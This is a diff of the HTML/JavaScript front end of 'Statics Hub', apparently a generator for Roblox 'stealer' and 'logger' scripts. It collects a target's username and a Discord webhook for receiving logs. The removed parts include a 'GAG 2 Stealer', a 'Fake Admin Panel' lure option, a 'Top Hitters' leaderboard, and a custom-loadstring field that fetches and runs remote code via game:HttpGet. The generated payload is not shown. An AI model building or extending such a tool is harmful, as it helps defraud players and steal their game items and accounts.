-    <button class="btn-retry" onclick="closeModal('serverGateModal'); loginWithDiscord()">↺ Already joined? Sign in again</button>
-  </div>
-</div> -->
-
-<!-- ═══ LOGIN REQUIRED MODAL ═══ -->
-<div class="modal-overlay hidden" id="loginModal" role="dialog" aria-modal="true" aria-labelledby="loginTitle">
+<!-- LOGIN MODAL -->
+<div class="modal-overlay hidden" id="loginModal" role="dialog" aria-modal="true">
   <div class="modal-box">
     <div class="auth-eyebrow">AUTH / 01</div>
-    <h2 id="loginTitle">Connect your Discord</h2>
+    <h2>Connect your Discord</h2>
     <p>Sign in once to unlock script generation and keep your activity tied to your Discord identity.</p>
     <div class="auth-status" id="loginStatus" aria-live="polite">READY TO CONNECT</div>
     <div class="modal-btns">
       <button class="btn-discord" id="loginModalBtn" type="button" aria-busy="false" onclick="loginWithDiscord()">
         <svg viewBox="0 0 24 24" fill="currentColor" style="width:15px;height:15px"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057.101 18.08.114 18.1.13 18.113a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
-         <span class="auth-button-label">Sign in with Discord</span>
+        <span class="auth-button-label">Sign in with Discord</span>
       </button>
     </div>
     <p class="auth-note">Identity permission only. Webhook values stay in this browser.</p>
@@ -2060,7 +573,7 @@
   </div>
 </div>
 
-<!-- ═══ ADMIN PANEL MODAL ═══ -->
+<!-- ADMIN PANEL -->
 <div class="modal-overlay hidden" id="adminModal">
   <div class="admin-modal-box">
     <div class="admin-header">
@@ -2072,244 +585,99 @@
       <button class="admin-tab" onclick="switchAdminTab('users', this)">Users</button>
     </div>
     <div class="admin-body">
-      <!-- ROLES TAB -->
       <div class="admin-tab-pane active" id="adminTab-roles">
-        <p class="admin-section-title">Create a new role</p>
-        <div class="role-form">
-          <input class="role-name-input" id="newRoleName" type="text" placeholder="Role name (e.g. VIP, Moderator)">
-          <input class="role-color-input" id="newRoleColor" type="color" value="#f5f5f5" title="Pick a color">
-          <button class="btn-add-role" onclick="addRole()">+ Add Role</button>
+        <p class="admin-section-title" style="font-family:'Share Tech Mono',monospace;font-size:0.68rem;text-transform:uppercase;letter-spacing:0.1em;color:var(--muted);margin-bottom:0.7rem;">Create a new role</p>
+        <div style="display:flex;gap:0.6rem;align-items:center;margin-bottom:1rem;flex-wrap:wrap;">
+          <input id="newRoleName" type="text" placeholder="Role name (e.g. VIP, Moderator)" style="flex:1;min-width:140px;background:var(--surface);border:1px solid var(--border);border-radius:7px;padding:0.5rem 0.8rem;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:0.8rem;outline:none;">
+          <input id="newRoleColor" type="color" value="#8dffd1" title="Pick a color" style="width:40px;height:36px;border:1px solid var(--border);border-radius:7px;background:var(--surface);cursor:pointer;padding:2px;">
+          <button onclick="addRole()" style="padding:0.5rem 0.9rem;background:rgba(141,255,209,0.06);border:1px solid rgba(141,255,209,0.35);border-radius:7px;color:var(--neon);font-family:'Share Tech Mono',monospace;font-size:0.68rem;text-transform:uppercase;cursor:pointer;white-space:nowrap;">+ Add Role</button>
         </div>
-        <p class="admin-section-title">Existing roles</p>
-        <div class="roles-list" id="rolesList"></div>
+        <p style="font-family:'Share Tech Mono',monospace;font-size:0.68rem;text-transform:uppercase;letter-spacing:0.1em;color:var(--muted);margin-bottom:0.7rem;">Existing roles</p>
+        <div id="rolesList"></div>
       </div>
-      <!-- USERS TAB -->
       <div class="admin-tab-pane" id="adminTab-users">
-        <p class="admin-section-title">Users who have signed in</p>
+        <p style="font-family:'Share Tech Mono',monospace;font-size:0.68rem;text-transform:uppercase;letter-spacing:0.1em;color:var(--muted);margin-bottom:0.7rem;">Users who have signed in</p>
         <div id="usersList"></div>
       </div>
     </div>
   </div>
 </div>
 
-<!-- ═══ HOME SCREEN ═══ -->
-<div id="homeScreen" class="home-screen">
+<!-- MAIN CONTENT -->
+<div class="main-container home-screen" id="homeScreen">
   <h1 class="home-title">STATICS HUB</h1>
-  <h1 class="home-subtitle">LOGGER</h1>
-  <p class="home-subtitle-sub">CHOOSE YOUR TOOL</p>
-  <div class="tool-selector">
-    <div class="tool-card" onclick="switchToTool('brainrot')">
-      <div class="tool-icon">
-        <img src="https://static.wikia.nocookie.net/logopedia/images/d/d1/StealABrainrot.png" alt="Steal A Brainrot">
-      </div>
-      <div class="tool-name">STEAL A BRAINROT</div>
-      <div class="tool-desc">Roblox Brainrot Trade Script Generator with advanced options</div>
-    </div>
-    <div class="tool-card" onclick="switchToTool('gag2')">
-      <div class="tool-icon">
-        <img src="https://gag.gg/logo.png" alt="GAG 2">
-      </div>
-      <div class="tool-name">GAG 2</div>
-      <div class="tool-desc">Grow A Garden 2 Stealer with custom GUI options</div>
-    </div>
-    <div class="tool-card" onclick="switchToTool('credits')">
-      <div class="tool-icon">
-        <div class="credits-card-mark">✦</div>
-      </div>
-      <div class="tool-name">CREDITS</div>
-      <div class="tool-desc">Meet the people behind Statics Hub and see their roles</div>
-    </div>
-  </div>
+  <h1 class="home-subtitle">MORERIA GENERATOR</h1>
+  <p class="home-subtitle-sub">GENERATE MORERIA SCRIPTS WITH CUSTOM LOGGERS</p>
 
-  <!-- TOP HITTERS -->
-  <div class="top-hitters-section">
-    <div class="top-hitters-header">
-      <div class="dot dot-cyan"></div>
-      <span class="top-hitters-title">TOP HITTERS</span>
-      <div class="dot dot-cyan"></div>
-    </div>
-    <div class="top-hitters-cards" id="topHittersCards">
-      <!-- rendered by JS -->
-    </div>
-  </div>
-</div>
+  <div class="tool-wrapper">
+    <header class="tool-header">
+      <h1>Moreria Logger</h1>
+      <p class="tagline">Powered by Statics Hub</p>
+    </header>
 
-<!-- ═══ BACK BUTTON ═══ -->
-<a href="#" class="back-button" onclick="backToHome()" style="display: none;" id="backButton">← BACK</a>
-
-<!-- ═══ TOOL CONTENT ═══ -->
-<div id="mainContent" style="display: none;">
-  <!-- BRAINROT TOOL -->
-  <div id="brainrotContent" class="content-area">
-    <div class="tool-wrapper">
-      <header class="tool-header">
-        <h1>Steal a Brainrot</h1>
-        <p class="tagline">Made by MLK</p>
-      </header>
-      <div class="panel">
-        <div class="ph"><div class="dot dot-cyan"></div><span class="ph-title">Select Brainrot Animals</span></div>
-        <div class="pb">
-          <div class="search-row">
-            <input class="search-input" id="searchBox" type="text" placeholder="Search animals..." oninput="filterList()">
-            <button class="btn-sm" onclick="selectAll()">All</button>
-            <button class="btn-sm red" onclick="clearAll()">Clear</button>
-          </div>
-          <div class="animal-list" id="animalList"></div>
-          <div id="customBrainrotInput">
-            <input type="text" id="customBrainrotName" placeholder="Add custom brainrot name...">
-            <button onclick="addCustomBrainrot()">Add</button>
-          </div>
-          <div id="pasteCustomListContainer">
-            <textarea id="pasteCustomListTextarea" placeholder="Paste your custom list here, e.g.:
-[&quot;Meowl&quot;] = true,
-[&quot;Skibidi Toilet&quot;] = true,"></textarea>
-            <button onclick="parsePastedList()">Paste Custom List</button>
-          </div>
-          <div class="meta-row">
-            <span class="sel-count"><span id="selNum">0</span> selected</span>
-          </div>
+    <!-- ANIMAL SELECTION PANEL -->
+    <div class="panel">
+      <div class="ph"><div class="dot"></div><span class="ph-title">Select Brainrot Animals</span></div>
+      <div class="pb">
+        <div class="search-row">
+          <input class="search-input" id="searchBox" type="text" placeholder="Search animals..." oninput="filterList()">
+          <button class="btn-sm" onclick="selectAll()">All</button>
+          <button class="btn-sm red" onclick="clearAll()">Clear</button>
         </div>
-      </div>
-      <div class="panel">
-        <div class="ph"><div class="dot dot-purple"></div><span class="ph-title">Roblox Username</span></div>
-        <div class="pb">
-          <label class="lbl">Target username</label>
-          <div style="position:relative;">
-            <input class="txt" id="usernameInput" type="text" placeholder="e.g. Builderman" autocomplete="off" spellcheck="false">
-            <div id="usernameSuggestions"></div>
-          </div>
-          <p class="hint" id="usernameHint">The Roblox username to target in the script (3 characters minimum).</p>
+        <div class="animal-list" id="animalList"></div>
+        <div style="display:flex;gap:0.5rem;margin-top:1rem;">
+          <input type="text" id="customBrainrotName" placeholder="Add custom brainrot name..." style="flex:1;background:rgba(6,10,15,0.7);border:1px solid var(--border);border-radius:8px;padding:0.55rem 0.85rem;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:0.82rem;outline:none;">
+          <button class="btn-sm" onclick="addCustomBrainrot()">Add</button>
         </div>
-      </div>
-      <div class="panel">
-        <div class="ph"><div class="dot dot-discord"></div><span class="ph-title">Discord Webhook</span></div>
-        <div class="pb">
-          <label class="lbl">Webhook URL</label>
-          <input class="txt" id="webhookInput" type="text" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" spellcheck="false" oninput="validateWebhook()">
-          <p class="hint" id="webhookHint">Paste your Discord webhook (must start with https://discord.com/api/webhooks/).</p>
+        <div style="margin-top:1rem;">
+          <textarea id="pasteCustomListTextarea" placeholder='Paste your custom list here, e.g.:
+["Meowl"] = true,
+["Skibidi Toilet"] = true,' style="width:100%;background:rgba(6,10,15,0.7);border:1px solid var(--border);border-radius:8px;padding:0.72rem 1rem;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:0.88rem;min-height:100px;resize:vertical;outline:none;"></textarea>
+          <button class="btn-sm" style="margin-top:0.5rem;" onclick="parsePastedList()">Paste Custom List</button>
         </div>
-      </div>
-      <div class="panel">
-        <div class="ph"><div class="dot dot-discord"></div><span class="ph-title">Gui Selector</span></div>
-        <div class="pb">
-          <div class="admin-mode-selector">
-            <button class="admin-mode-btn active" onclick="setAdminMode('no-gui',event)">No GUI</button>
-            <button class="admin-mode-btn" onclick="setAdminMode('admin-panel',event)">Fake Admin Panel</button>
-            <button class="admin-mode-btn" onclick="setAdminMode('freeze',event)">Freeze</button>
-            <button class="admin-mode-btn" onclick="setAdminMode('custom',event)">Custom</button>
-          </div>
-          <div id="customAdminInput">
-            <label class="lbl">Custom Loadstring</label>
-            <input class="txt" id="customAdminLoadstring" type="text" placeholder="e.g. loadstring(game:HttpGet('https://...'))()" oninput="updateCustomAdmin()">
-            <p class="hint">Enter your custom loadstring here.</p>
-          </div>
-        </div>
-      </div>
-      <button class="btn-gen" onclick="generate()">⚡ Generate Script</button>
-      <div class="panel">
-        <div class="out-ph">
-          <div class="dot dot-green"></div>
-          <span class="out-ph-title">Generated Script</span>
-          <button class="btn-copy" id="copyBtn" onclick="copyOut()">⧉ Copy</button>
-        </div>
-        <div class="pb">
-          <div class="code-block empty" id="outputBlock">-- Fill in the fields above and hit Generate Script...</div>
+        <div class="meta-row">
+          <span class="sel-count"><span id="selNum">0</span> selected</span>
         </div>
       </div>
     </div>
-  </div>
 
-  <!-- GAG2 TOOL -->
-  <div id="gag2Content" class="content-area">
-    <div class="tool-wrapper">
-      <header class="tool-header">
-        <h1>GAG 2 STEALER</h1>
-        <p class="tagline">MADE BY MLK</p>
-      </header>
-      <div class="gag2-panel">
-        <div class="gag2-ph"><div class="gag2-dot"></div><div class="gag2-ph-title">Target Setup</div></div>
-        <div class="gag2-pb">
-          <div class="gag2-f-field">
-            <label class="gag2-lbl">Target Username</label>
-            <input type="text" id="gag2-usernameInput" class="gag2-f-input" placeholder="Enter Roblox Target Username..." autocomplete="off">
-            <span id="gag2-usernameHint" class="gag2-f-hint">The Roblox username to target in the script.</span>
-            <div id="gag2-usernameSuggestions"></div>
-          </div>
-          <div class="gag2-f-field">
-            <label class="gag2-lbl">Discord Webhook</label>
-            <input type="text" id="gag2-webhookInput" class="gag2-f-input" placeholder="https://discord.com/api/webhooks/..." oninput="validateGag2Webhook()">
-            <span id="gag2-webhookHint" class="gag2-f-hint">Discord webhook for receiving logs.</span>
-          </div>
+    <!-- USERNAME PANEL -->
+    <div class="panel">
+      <div class="ph"><div class="dot"></div><span class="ph-title">Roblox Username</span></div>
+      <div class="pb">
+        <label class="lbl">Target username</label>
+        <div style="position:relative;">
+          <input class="txt" id="usernameInput" type="text" placeholder="e.g. Builderman" autocomplete="off" spellcheck="false">
+          <div id="usernameSuggestions"></div>
         </div>
-      </div>
-      <div class="gag2-panel">
-        <div class="gag2-ph"><div class="gag2-dot"></div><div class="gag2-ph-title">Script GUI</div></div>
-        <div class="gag2-pb">
-          <label class="gag2-lbl">GUI</label>
-          <div class="gag2-admin-grid">
-            <div class="gag2-admin-mode-btn active" onclick="setGag2AdminMode('no-gui', event)">No GUI</div>
-            <div class="gag2-admin-mode-btn" onclick="setGag2AdminMode('dupe', event)">Dupe</div>
-            <div class="gag2-admin-mode-btn" onclick="setGag2AdminMode('Hub', event)">Hub</div>
-          </div>
-          <div class="gag2-admin-grid" style="grid-template-columns: 1fr;">
-            <div class="gag2-admin-mode-btn" onclick="setGag2AdminMode('custom', event)">Custom Loadstring</div>
-          </div>
-          <div id="gag2-customAdminInput" class="gag2-f-field" style="display:none; margin-top:0.5rem;">
-            <input type="text" id="gag2-customAdminLoadstring" class="gag2-f-input" placeholder="game:HttpGet('...')" oninput="updateGag2CustomAdmin()">
-          </div>
-        </div>
-      </div>
-      <button class="gag2-btn-gen" onclick="generateGag2()">⚡ Generate Script</button>
-      <div class="gag2-output-container">
-        <div id="gag2-outputBlock" class="gag2-code-block empty">-- Code output stream idle. Complete configuration settings above.</div>
-        <button id="gag2-copyBtn" class="gag2-btn-copy" onclick="copyGag2Out()">⧉ Copy</button>
+        <p class="hint" id="usernameHint">The Roblox username to target in the script (3 characters minimum).</p>
       </div>
     </div>
-  </div>
 
-  <!-- CREDITS -->
-  <div id="creditsContent" class="content-area">
-    <div class="credits-wrapper">
-      <header class="tool-header">
-        <h1>Credits</h1>
-        <p class="tagline">The people behind Statics Hub</p>
-      </header>
-      <section class="credits-panel">
-        <div class="credits-panel-head">
-          <span class="credits-panel-title">Statics Hub Team</span>
-          <span class="credits-panel-kicker">02 Contributors</span>
-        </div>
-        <div class="credits-grid" id="creditsGrid"></div>
-      </section>
+    <!-- WEBHOOK PANEL -->
+    <div class="panel">
+      <div class="ph"><div class="dot"></div><span class="ph-title">Discord Webhook</span></div>
+      <div class="pb">
+        <label class="lbl">Webhook URL</label>
+        <input class="txt" id="webhookInput" type="text" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" spellcheck="false" oninput="validateWebhook()">
+        <p class="hint" id="webhookHint">Paste your Discord webhook (must start with https://discord.com/api/webhooks/).</p>
+      </div>
     </div>
-  </div>
-</div>
 
-<!-- ═══ LIVE CHAT ═══ -->
-<button class="chat-toggle" id="chatToggle" onclick="toggleChat()">
-  💬
-  <span class="chat-unread" id="chatUnread">0</span>
-</button>
-<div class="chat-panel hidden" id="chatPanel">
-  <div class="chat-header">
-    <div class="dot dot-green" style="width:6px;height:6px;"></div>
-    <span class="chat-header-title">Live Chat</span>
-    <span class="chat-online"><span class="chat-online-dot"></span>Live</span>
-  </div>
-  <div class="chat-messages" id="chatMessages">
-    <div class="chat-system-msg">— Chat started. Say hello! —</div>
-  </div>
-  <div id="chatInputArea" class="chat-input-area" style="display:none">
-    <input class="chat-input" id="chatInput" type="text" placeholder="Type a message..." maxlength="200" onkeydown="if(event.key==='Enter') sendChatMessage()">
-    <button class="chat-send" onclick="sendChatMessage()">Send</button>
-  </div>
-  <div id="chatLoginPrompt" class="chat-login-prompt">
-    Sign in to chat
-    <br>
-    <button onclick="loginWithDiscord()">
-      <svg viewBox="0 0 24 24" fill="currentColor" style="width:12px;height:12px"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057.101 18.08.114 18.1.13 18.113a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.030z"/></svg>
-      Sign in with Discord
-    </button>
+    <!-- GENERATE BUTTON -->
+    <button class="btn-gen" onclick="generate()">⚡ Generate Script</button>
+
+    <!-- OUTPUT PANEL -->
+    <div class="panel">
+      <div class="out-ph">
+        <div class="dot"></div>
+        <span class="out-ph-title">Generated Script</span>
+        <button class="btn-copy" id="copyBtn" onclick="copyOut()">⧉ Copy</button>
+      </div>
+      <div class="pb">
+        <div class="code-block empty" id="outputBlock">-- Fill in the fields above and hit Generate Script...</div>
+      </div>
+    </div>
   </div>
 </div>
 
@@ -2317,163 +685,42 @@
 
 <script>
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  CONFIG — set your Discord Client ID here
+//  CONFIG
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 const DISCORD_CLIENT_ID = '1368253122299822292';
 const DISCORD_REDIRECT_URI = window.location.origin + window.location.pathname;
 const DISCORD_AUTH_TIMEOUT_MS = 12000;
 
-// Admin Discord usernames and their titles
 const ADMIN_MAP = {
-  'bythbzen':    { title: 'Founder', color: '#f5f5f5' },
-  'visualcoder': { title: 'Owner',   color: '#f5f5f5' },
-  'levraimlk':  { title: 'Developer', color: '#f5f5f5' }
+  'bythbzen':    { title: 'Founder', color: '#8dffd1' },
+  'visualcoder': { title: 'Owner',   color: '#8dffd1' },
+  'levraimlk':   { title: 'Developer', color: '#8dffd1' }
 };
-
-const CREDIT_TEAM = [
-  {
-    id: '1350114888940523635',
-    username: 'Bythbzen',
-    role: 'Founder',
-    contribution: 'Founded Statics Hub and shaped the project direction.'
-  },
-  {
-    id: '730782816513556560',
-    username: 'levraimlk',
-    role: 'Owner / Developer',
-    contribution: 'Owns the project and leads its development and implementation.'
-  }
-];
-
-const SKRINHUB_API = 'https://c58175c8-ffbe-4518-9a89-8456b2c912f0-00-3jhjthxjlcyh1.sisko.replit.dev';
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 //  STATE
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-let currentTool = null;
 let selected = new Set();
-let adminMode = 'no-gui';
-let customAdminLoadstring = '';
-let gag2AdminMode = 'no-gui';
-let gag2CustomAdminLoadstring = '';
-let chatOpen = false;
-let chatUnreadCount = 0;
 let currentUser = null;
 let authRequestActive = false;
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 //  SCRIPTS COUNTER
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-function getScriptCount() { return parseInt(localStorage.getItem('statics_hub_scripts_count') || '0'); }
+function getScriptCount() { return parseInt(localStorage.getItem('statics_moreria_count') || '0'); }
 function incrementScriptCount() {
   const n = getScriptCount() + 1;
-  localStorage.setItem('statics_hub_scripts_count', n);
+  localStorage.setItem('statics_moreria_count', n);
   document.getElementById('counterNum').textContent = n;
-  // Track per-user hit count
-  if (currentUser) {
-    const hitters = getTopHitters();
-    const key = currentUser.username;
-    if (!hitters[key]) {
-      hitters[key] = { username: currentUser.username, display_name: currentUser.global_name || currentUser.username, avatar: currentUser.avatar, count: 0 };
-    }
-    hitters[key].count++;
-    hitters[key].display_name = currentUser.global_name || currentUser.username;
-    hitters[key].avatar = currentUser.avatar;
-    saveTopHitters(hitters);
-    renderTopHitters();
-  }
 }
 function initCounter() { document.getElementById('counterNum').textContent = getScriptCount(); }
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  TOP HITTERS
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-function getTopHitters() { try { return JSON.parse(localStorage.getItem('statics_hub_top_hitters') || '{}'); } catch { return {}; } }
-function saveTopHitters(h) { localStorage.setItem('statics_hub_top_hitters', JSON.stringify(h)); }
-
-function renderTopHitters() {
-  const container = document.getElementById('topHittersCards');
-  if (!container) return;
-  const hitters = getTopHitters();
-  const sorted = Object.values(hitters).sort((a, b) => b.count - a.count).slice(0, 3);
-  const rankEmojis = ['🥇', '🥈', '🥉'];
-  const rankClasses = ['rank-1', 'rank-2', 'rank-3'];
-  const rankLabels = ['#1', '#2', '#3'];
-
-  if (!sorted.length) {
-    container.innerHTML = '<p class="hitter-empty">No scripts generated yet. Be the first top hitter!</p>';
-    return;
-  }
-
-  container.innerHTML = sorted.map((h, i) => `
-    <div class="hitter-card ${rankClasses[i]}">
-      <div class="hitter-rank">${rankEmojis[i]}</div>
-      <img class="hitter-avatar" src="${h.avatar || 'https://cdn.discordapp.com/embed/avatars/0.png'}" alt="">
-      <div class="hitter-name">${escHtml(h.display_name)}</div>
-      <div class="hitter-handle">@${escHtml(h.username)}</div>
-      <div class="hitter-count">${h.count.toLocaleString()}</div>
-      <div class="hitter-count-label">scripts executed</div>
-    </div>
-  `).join('');
-}
-
-function getDefaultDiscordAvatar(id) {
-  try {
-    const avatarIndex = Number((BigInt(id) >> 22n) % 6n);
-    return `https://cdn.discordapp.com/embed/avatars/${avatarIndex}.png`;
-  } catch {
-    return 'https://cdn.discordapp.com/embed/avatars/0.png';
-  }
-}
-
-function getCreditAvatar(member) {
-  const knownUser = getKnownUsers().find(user => String(user.id) === member.id);
-  if (knownUser?.avatar) return knownUser.avatar;
-  if (currentUser && String(currentUser.id) === member.id && currentUser.avatar) {
-    return currentUser.avatar;
-  }
-  return getDefaultDiscordAvatar(member.id);
-}
-
-function renderCredits() {
-  const container = document.getElementById('creditsGrid');
-  if (!container) return;
-
-  container.innerHTML = CREDIT_TEAM.map(member => {
-    const fallback = getDefaultDiscordAvatar(member.id);
-    const avatar = getCreditAvatar(member);
-    return `
-      <article class="credit-card">
-        <div class="credit-card-top">
-          <img class="credit-avatar" src="${escHtml(avatar)}" alt="${escHtml(member.username)} profile picture"
-            onerror="this.onerror=null;this.src='${fallback}'">
-          <div>
-            <div class="credit-username">${escHtml(member.username)}</div>
-            <div class="credit-id">Discord ID: ${escHtml(member.id)}</div>
-          </div>
-        </div>
-        <div class="credit-role-row">
-          <span class="credit-role-label">Role</span>
-          <span class="credit-role">${escHtml(member.role)}</span>
-        </div>
-        <div>
-          <div class="credit-contribution-label">Contribution</div>
-          <p class="credit-contribution">${escHtml(member.contribution)}</p>
-        </div>
-      </article>
-    `;
-  }).join('');
-}
-
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  DISCORD OAUTH2 (Implicit flow — client-side only)
+//  DISCORD OAUTH2
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 function setAuthState(state, message) {
   const status = document.getElementById('loginStatus');
-  if (status) {
-    status.dataset.state = state;
-    status.textContent = message;
-  }
+  if (status) { status.dataset.state = state; status.textContent = message; }
 }
 
 function setAuthButtonLoading(isLoading) {
@@ -2488,7 +735,7 @@ function setAuthButtonLoading(isLoading) {
 }
 
 function clearStoredDiscordUser() {
-  localStorage.removeItem('statics_hub_discord_user');
+  localStorage.removeItem('statics_moreria_discord_user');
   currentUser = null;
 }
 
@@ -2497,7 +744,7 @@ function loginWithDiscord() {
   authRequestActive = true;
   setAuthState('loading', 'OPENING DISCORD');
   setAuthButtonLoading(true);
-  sessionStorage.setItem('statics_hub_auth_pending', '1');
+  sessionStorage.setItem('statics_moreria_auth_pending', '1');
   const params = new URLSearchParams({
     client_id: DISCORD_CLIENT_ID,
     redirect_uri: DISCORD_REDIRECT_URI,
@@ -2514,7 +761,7 @@ async function handleDiscordCallback() {
   const oauthError = params.get('error');
   if (oauthError) {
     history.replaceState(null, '', window.location.pathname + window.location.search);
-    sessionStorage.removeItem('statics_hub_auth_pending');
+    sessionStorage.removeItem('statics_moreria_auth_pending');
     authRequestActive = false;
     setAuthButtonLoading(false);
     setAuthState('error', 'DISCORD LOGIN CANCELLED');
@@ -2524,14 +771,12 @@ async function handleDiscordCallback() {
   const token = params.get('access_token');
   if (!token) return;
 
-  // Clean the URL hash
   history.replaceState(null, '', window.location.pathname + window.location.search);
-  sessionStorage.removeItem('statics_hub_auth_pending');
+  sessionStorage.removeItem('statics_moreria_auth_pending');
   setAuthState('loading', 'RETURNING FROM DISCORD');
 
   let timeoutId;
   try {
-    // Fetch the Discord profile to establish the signed-in session.
     const controller = new AbortController();
     timeoutId = setTimeout(() => controller.abort(), DISCORD_AUTH_TIMEOUT_MS);
     const userRes = await fetch('https://discord.com/api/users/@me', {
@@ -2553,8 +798,7 @@ async function handleDiscordCallback() {
       token,
       expires_at: Date.now() + Math.max(expiresIn, 300) * 1000
     };
-    localStorage.setItem('statics_hub_discord_user', JSON.stringify(userData));
-    trackKnownUser(userData);
+    localStorage.setItem('statics_moreria_discord_user', JSON.stringify(userData));
     setCurrentUser(userData);
     showToast('✅ Signed in as ' + userData.global_name, 'success');
   } catch (e) {
@@ -2569,13 +813,22 @@ async function handleDiscordCallback() {
   }
 }
 
+function getDefaultDiscordAvatar(id) {
+  try {
+    const avatarIndex = Number((BigInt(id) >> 22n) % 6n);
+    return `https://cdn.discordapp.com/embed/avatars/${avatarIndex}.png`;
+  } catch {
+    return 'https://cdn.discordapp.com/embed/avatars/0.png';
+  }
+}
+
 function showLoginGate() {
   if (currentUser) return;
   document.getElementById('loginModal').classList.remove('hidden');
 }
 
 function loadStoredUser() {
-  const stored = localStorage.getItem('statics_hub_discord_user');
+  const stored = localStorage.getItem('statics_moreria_discord_user');
   if (stored) {
     try {
       const user = JSON.parse(stored);
@@ -2595,32 +848,21 @@ function setCurrentUser(user) {
   document.getElementById('loginModal').classList.add('hidden');
   setAuthState('success', 'CONNECTED AS ' + (user.global_name || user.username).toUpperCase());
   setAuthButtonLoading(false);
-  // Update top bar
   const chip = document.getElementById('userChip');
   chip.classList.add('show');
   document.getElementById('loginBtn').style.display = 'none';
   document.getElementById('userAvatar').src = user.avatar;
   document.getElementById('userNameDisplay').textContent = user.global_name || user.username;
 
-  // Check admin
   const adminEntry = ADMIN_MAP[user.username];
   const adminBtn = document.getElementById('adminOpenBtn');
-  if (adminEntry) {
-    adminBtn.classList.add('show');
-  }
+  if (adminEntry) adminBtn.classList.add('show');
 
-  // Show their role badge in top bar
   applyUserRoleBadge(user.username);
-
-  // Update chat input
-  document.getElementById('chatInputArea').style.display = 'flex';
-  document.getElementById('chatLoginPrompt').style.display = 'none';
-  renderCredits();
 }
 
 function applyUserRoleBadge(username) {
   const topBadge = document.getElementById('topRoleBadge');
-  // Admin built-in badge
   if (ADMIN_MAP[username]) {
     const a = ADMIN_MAP[username];
     topBadge.textContent = a.title;
@@ -2630,7 +872,6 @@ function applyUserRoleBadge(username) {
     topBadge.style.display = 'inline';
     return;
   }
-  // Assigned role from admin panel
   const userRoles = getUserRoles();
   const roleId = userRoles[username];
   if (roleId) {
@@ -2649,8 +890,8 @@ function applyUserRoleBadge(username) {
 }
 
 function logout() {
-  localStorage.removeItem('statics_hub_discord_user');
-  sessionStorage.removeItem('statics_hub_auth_pending');
+  localStorage.removeItem('statics_moreria_discord_user');
+  sessionStorage.removeItem('statics_moreria_auth_pending');
   authRequestActive = false;
   currentUser = null;
   document.getElementById('userChip').classList.remove('show');
@@ -2658,20 +899,18 @@ function logout() {
   setAuthButtonLoading(false);
   setAuthState('idle', 'READY TO CONNECT');
   document.getElementById('adminOpenBtn').classList.remove('show');
-  document.getElementById('chatInputArea').style.display = 'none';
-  document.getElementById('chatLoginPrompt').style.display = 'block';
   showLoginGate();
 }
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 //  ADMIN PANEL
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-function getRoles() { try { return JSON.parse(localStorage.getItem('statics_hub_roles') || '[]'); } catch { return []; } }
-function saveRoles(r) { localStorage.setItem('statics_hub_roles', JSON.stringify(r)); }
-function getUserRoles() { try { return JSON.parse(localStorage.getItem('statics_hub_user_roles') || '{}'); } catch { return {}; } }
-function saveUserRoles(r) { localStorage.setItem('statics_hub_user_roles', JSON.stringify(r)); }
